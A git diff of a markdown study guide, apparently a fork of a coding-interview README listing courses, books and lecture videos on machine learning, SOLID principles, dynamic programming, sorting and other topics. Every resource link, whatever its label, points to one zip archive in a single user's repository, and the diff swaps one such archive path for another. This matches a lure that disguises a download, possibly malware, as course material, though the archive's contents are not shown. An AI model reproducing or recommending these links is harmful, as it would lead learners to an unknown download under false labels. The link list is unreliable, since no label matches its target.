     - Courses:
-        - [Great starter course: Machine Learning](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-              - [videos only](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Great starter course: Machine Learning](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+              - [videos only](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
               - see videos 12-18 for a review of linear algebra (14 and 15 are duplicates)
-        - [Neural Networks for Machine Learning](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Google's Deep Learning Nanodegree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Google/Kaggle Machine Learning Engineer Nanodegree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Self-Driving Car Engineer Nanodegree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Metis Online Course ($99 for 2 months)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Neural Networks for Machine Learning](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Google's Deep Learning Nanodegree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Google/Kaggle Machine Learning Engineer Nanodegree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Self-Driving Car Engineer Nanodegree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Metis Online Course ($99 for 2 months)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Resources:
         - Books:
-            - [Python Machine Learning](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-            - [Data Science from Scratch: First Principles with Python](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-            - [Introduction to Machine Learning with Python](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Machine Learning for Software Engineers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - Data School: https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip
+            - [Python Machine Learning](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+            - [Data Science from Scratch: First Principles with Python](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+            - [Introduction to Machine Learning with Python](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Machine Learning for Software Engineers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - Data School: https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip
 
 ---
 
@@ -1828,67 +1828,67 @@ You're never really done.
     You want to get hired in this century, right?
 
 - **SOLID**   
-    - [ ] [Bob Martin SOLID Principles of Object Oriented and Agile Design (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] S - [Single Responsibility Principle](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip) | [Single responsibility to each Object](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [more flavor](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] O - [Open/Closed Principle](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)  | [On production level Objects are ready for extension but not for modification](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [more flavor](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] L - [Liskov Substitution Principle](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip) | [Base Class and Derived class follow ‘IS A’ Principle](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [more flavor](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] I - [Interface segregation principle](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip) | clients should not be forced to implement interfaces they don't use
-        - [Interface Segregation Principle in 5 minutes (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [more flavor](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] D -[Dependency Inversion principle](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip) | Reduce the dependency In composition of objects.
-        - [Why Is The Dependency Inversion Principle And Why Is It Important](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [more flavor](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Bob Martin SOLID Principles of Object Oriented and Agile Design (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] S - [Single Responsibility Principle](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip) | [Single responsibility to each Object](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [more flavor](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] O - [Open/Closed Principle](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)  | [On production level Objects are ready for extension but not for modification](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [more flavor](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] L - [Liskov Substitution Principle](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip) | [Base Class and Derived class follow ‘IS A’ Principle](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [more flavor](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] I - [Interface segregation principle](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip) | clients should not be forced to implement interfaces they don't use
+        - [Interface Segregation Principle in 5 minutes (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [more flavor](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] D -[Dependency Inversion principle](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip) | Reduce the dependency In composition of objects.
+        - [Why Is The Dependency Inversion Principle And Why Is It Important](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [more flavor](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 
 - **Union-Find**
-    - [Overview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Naive Implementation](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Trees](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Union By Rank](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Path Compression](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Analysis Options](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Overview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Naive Implementation](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Trees](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Union By Rank](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Path Compression](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Analysis Options](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - **More Dynamic Programming** (videos)
-    - [6.006: Dynamic Programming I: Fibonacci, Shortest Paths](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [6.006: Dynamic Programming II: Text Justification, Blackjack](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [6.006: DP III: Parenthesization, Edit Distance, Knapsack](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [6.006: DP IV: Guitar Fingering, Tetris, Super Mario Bros.](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [6.046: Dynamic Programming & Advanced DP](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [6.046: Dynamic Programming: All-Pairs Shortest Paths](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [6.046: Dynamic Programming (student recitation)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [6.006: Dynamic Programming I: Fibonacci, Shortest Paths](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [6.006: Dynamic Programming II: Text Justification, Blackjack](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [6.006: DP III: Parenthesization, Edit Distance, Knapsack](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [6.006: DP IV: Guitar Fingering, Tetris, Super Mario Bros.](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [6.046: Dynamic Programming & Advanced DP](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [6.046: Dynamic Programming: All-Pairs Shortest Paths](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [6.046: Dynamic Programming (student recitation)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - **Advanced Graph Processing** (videos)
-    - [Synchronous Distributed Algorithms: Symmetry-Breaking. Shortest-Paths Spanning Trees](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Asynchronous Distributed Algorithms: Shortest-Paths Spanning Trees](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Synchronous Distributed Algorithms: Symmetry-Breaking. Shortest-Paths Spanning Trees](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Asynchronous Distributed Algorithms: Shortest-Paths Spanning Trees](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - MIT **Probability** (mathy, and go slowly, which is good for mathy things) (videos):
-    - [MIT 6.042J - Probability Introduction](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [MIT 6.042J - Conditional Probability](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [MIT 6.042J - Independence](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [MIT 6.042J - Random Variables](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [MIT 6.042J - Expectation I](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [MIT 6.042J - Expectation II](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [MIT 6.042J - Large Deviations](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [MIT 6.042J - Random Walks](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [MIT 6.042J - Probability Introduction](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [MIT 6.042J - Conditional Probability](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [MIT 6.042J - Independence](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [MIT 6.042J - Random Variables](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [MIT 6.042J - Expectation I](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [MIT 6.042J - Expectation II](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [MIT 6.042J - Large Deviations](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [MIT 6.042J - Random Walks](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [Simonson: Approximation Algorithms (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Simonson: Approximation Algorithms (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - **String Matching**
     - Rabin-Karp (videos):
-        - [Rabin Karps Algorithm](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Precomputing](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Optimization: Implementation and Analysis](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Table Doubling, Karp-Rabin](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Rolling Hashes, Amortized Analysis](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Rabin Karps Algorithm](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Precomputing](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Optimization: Implementation and Analysis](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Table Doubling, Karp-Rabin](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Rolling Hashes, Amortized Analysis](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Knuth-Morris-Pratt (KMP):
-        - [TThe Knuth-Morris-Pratt (KMP) String Matching Algorithm](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [TThe Knuth-Morris-Pratt (KMP) String Matching Algorithm](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Boyer–Moore string search algorithm
-        - [Boyer-Moore String Search Algorithm](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip%E2%80%93Moore_string_search_algorithm)
-        - [Advanced String Searching Boyer-Moore-Horspool Algorithms (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Coursera: Algorithms on Strings](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Boyer-Moore String Search Algorithm](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip%E2%80%93Moore_string_search_algorithm)
+        - [Advanced String Searching Boyer-Moore-Horspool Algorithms (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Coursera: Algorithms on Strings](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - starts off great, but by the time it gets past KMP it gets more complicated than it needs to be
         - nice explanation of tries
         - can be skipped
@@ -1896,114 +1896,114 @@ You're never really done.
 - **Sorting**
 
     - Stanford lectures on sorting:
-        - [Lecture 15 | Programming Abstractions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Lecture 16 | Programming Abstractions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - Shai Simonson, [https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip):
-        - [Algorithms - Sorting - Lecture 2 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Algorithms - Sorting II - Lecture 3 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Lecture 15 | Programming Abstractions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Lecture 16 | Programming Abstractions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - Shai Simonson, [https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip):
+        - [Algorithms - Sorting - Lecture 2 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Algorithms - Sorting II - Lecture 3 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Steven Skiena lectures on sorting:
-        - [lecture begins at 26:46 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [lecture begins at 27:40 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [lecture begins at 35:00 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [lecture begins at 23:50 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [lecture begins at 26:46 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [lecture begins at 27:40 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [lecture begins at 35:00 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [lecture begins at 23:50 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## Video Series
 
 Sit back and enjoy.
 
-- [List of individual Dynamic Programming problems (each is short)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [List of individual Dynamic Programming problems (each is short)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [x86 Architecture, Assembly, Applications (11 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [x86 Architecture, Assembly, Applications (11 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [MIT 18.06 Linear Algebra, Spring 2005 (35 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [MIT 18.06 Linear Algebra, Spring 2005 (35 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [Excellent - MIT Calculus Revisited: Single Variable Calculus](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Excellent - MIT Calculus Revisited: Single Variable Calculus](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - CSE373 - Analysis of Algorithms (25 videos)
-    - [Skiena lectures from Algorithm Design Manual](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Skiena lectures from Algorithm Design Manual](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [UC Berkeley 61B (Spring 2014): Data Structures (25 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [UC Berkeley 61B (Spring 2014): Data Structures (25 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [UC Berkeley 61B (Fall 2006): Data Structures (39 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [UC Berkeley 61B (Fall 2006): Data Structures (39 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [UC Berkeley 61C: Machine Structures (26 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [UC Berkeley 61C: Machine Structures (26 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [OOSE: Software Dev Using UML and Java (21 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [OOSE: Software Dev Using UML and Java (21 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- ~~[UC Berkeley CS 152: Computer Architecture and Engineering (20 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)~~
+- ~~[UC Berkeley CS 152: Computer Architecture and Engineering (20 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)~~
 
-- [MIT 6.004: Computation Structures (49 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [MIT 6.004: Computation Structures (49 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [Carnegie Mellon - Computer Architecture Lectures (39 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Carnegie Mellon - Computer Architecture Lectures (39 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [MIT 6.006: Intro to Algorithms (47 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [MIT 6.006: Intro to Algorithms (47 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [MIT 6.033: Computer System Engineering (22 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [MIT 6.033: Computer System Engineering (22 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [MIT 6.034 Artificial Intelligence, Fall 2010 (30 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [MIT 6.034 Artificial Intelligence, Fall 2010 (30 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [MIT 6.042J: Mathematics for Computer Science, Fall 2010 (25 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [MIT 6.042J: Mathematics for Computer Science, Fall 2010 (25 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [MIT 6.046: Design and Analysis of Algorithms (34 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [MIT 6.046: Design and Analysis of Algorithms (34 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [MIT 6.050J: Information and Entropy, Spring 2008 (19 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [MIT 6.050J: Information and Entropy, Spring 2008 (19 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [MIT 6.824: Distributed Systems, Spring 2020 (20 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [MIT 6.824: Distributed Systems, Spring 2020 (20 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [MIT 6.851: Advanced Data Structures (22 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [MIT 6.851: Advanced Data Structures (22 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [MIT 6.854: Advanced Algorithms, Spring 2016 (24 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [MIT 6.854: Advanced Algorithms, Spring 2016 (24 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [Harvard COMPSCI 224: Advanced Algorithms (25 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Harvard COMPSCI 224: Advanced Algorithms (25 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [MIT 6.858 Computer Systems Security, Fall 2014](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [MIT 6.858 Computer Systems Security, Fall 2014](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [Stanford: Programming Paradigms (27 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
